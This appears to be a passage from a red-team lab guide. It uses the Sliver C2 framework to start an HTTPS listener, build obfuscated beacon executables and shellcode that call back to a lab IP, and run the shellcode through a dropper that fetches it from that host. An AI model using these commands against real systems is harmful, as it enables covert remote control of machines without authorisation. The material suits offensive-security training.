

Sliver supports multiple egress callback protocols like mTLS, DNS and HTTPS. In this case we use HTTPS for egress callbacks. Start a HTTPS listener to listen on port 443 for C2 traffic.


```
https
```

Generate a HTTPS Portable Executable (exe) beacon with basic obfuscation features enabled (-e).

```
generate beacon -b https://192.168.100.139 -e -f exe -N student139_https -s Implants/student139_https.exe
```

Similarly, generate HTTPS beacon shellcode with basic obfuscation features enabled.

```
generate beacon -b https://192.168.100.139 -e -f shellcode -N student139_https -s Implants/student139_https.bin
```

```
C:\AD\Tools\Sliver\NtDropper.exe 192.168.100.139 student139_https.bin
```


